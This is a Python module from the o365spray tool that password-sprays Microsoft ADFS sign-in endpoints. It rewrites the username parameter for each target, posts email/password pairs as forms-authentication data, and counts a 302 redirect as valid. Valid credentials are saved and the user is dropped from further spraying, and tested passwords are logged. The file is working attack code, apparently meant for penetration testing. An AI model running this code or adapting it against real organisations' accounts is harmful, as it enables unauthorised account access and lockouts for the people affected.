#!/usr/bin/env python3

import logging
import time
from urllib.parse import quote

from o365spray.core.handlers.sprayer.modules.base import SprayerBase
from o365spray.core.utils import (
    Defaults,
    text_colors,
)


class SprayModule_adfs(SprayerBase):
    """ADFS Sprayer module class"""

    def __init__(self, *args, **kwargs):
        """Initialize the parent base class"""
        super(SprayModule_adfs, self).__init__(*args, **kwargs)
        # Updated: ADFS request logging is now centralized in BaseHandler.

    def _spray(self, domain: str, user: str, password: str):
        """Spray users via a managed ADFS server

        Arguments:
            domain: domain to spray
            user: username for authentication
            password: password for authentication

        Raises:
            Exception: generic handler so we can successfully fail without
              crashing the run
        """
        try:
            # Updated: abort early if lockout threshold already reached.
            if self._should_abort():
                return

            # Grab external headers from config.py
            # Updated: copy headers to avoid cross-request mutation.
            headers = Defaults.HTTP_HEADERS.copy()

            # Build email if not already built
            email = self.HELPER.check_email(user, domain)

            # Write the tested user
            tested = f"{email}:{password}"
            if self.writer:
                self.tested_writer.write(tested)

            time.sleep(0.250)

            # Fix the ADFS URL for each user since the AuthUrl was pulled during
            # validation using a bogus user
            url, url_params = self.adfs_url.split("?", 1)
            url_params = url_params.split("&")
            for i in range(len(url_params)):
                if "username=" in url_params[i]:
                    url_params[i] = f"username={email}"
            url_params = "&".join(url_params)
            url = f"{url}?{url_params}"

            # TODO: Look into how to properly implement FireProx proxy URL here...

            data = f"UserName={quote(email)}&Password={quote(password)}&AuthMethod=FormsAuthentication"
            # Updated: include retry configuration for transient failures.
            response = self._send_request(
                "post",
                url,
                data=data,
                headers=headers,
                proxies=self.proxies,
                timeout=self.timeout,
                sleep=self.sleep,
                jitter=self.jitter,
                retries=self.request_retries,
                retry_backoff=self.request_retry_backoff,
                # Updated: include request context for per-request logging.
                log_context={
                    "module": self.module_tag,
                    "action": "spray",
                    "target": email,
                    "username": user,
                    "password": password,
                },
            )
            # Updated: detect explicit lockout signals where available.
            if self._detect_lockout_signal(response):
                self._record_lockout(reason="AADSTS50053")

            status = response.status_code

            if status == 302:
                if self.writer:
                    self.valid_writer.write(tested)
                self.VALID_CREDENTIALS.append(tested)
                # Updated: richer CLI output for valid responses.
                self._log_spray_result(
                    "VALID",
                    email,
                    password,
                    status=status,
                    reason=response.reason,
                    detail="ADFS redirect (valid)",
                )
                # Remove valid user from being sprayed again
                self.userlist.remove(user)

            else:
                resp_len = len(response.content)
                redirect_loc = response.headers.get('Location', 'N/A')
                # Updated: richer CLI output for invalid responses with context.
                detail = f"len={resp_len} redirect={redirect_loc}"
                self._log_spray_result(
                    "INVALID",
                    email,
                    password,
                    status=status,
                    reason=response.reason,
                    detail=detail,
                )

        except Exception as e:
            # Updated: surface request failures with context.
            logging.warning(
                f"[{text_colors.WARNING}REQUEST_FAILED{text_colors.ENDC}] "
                f"{user} | module={self.module_tag} | error={type(e).__name__}: {e}"
            )
            pass
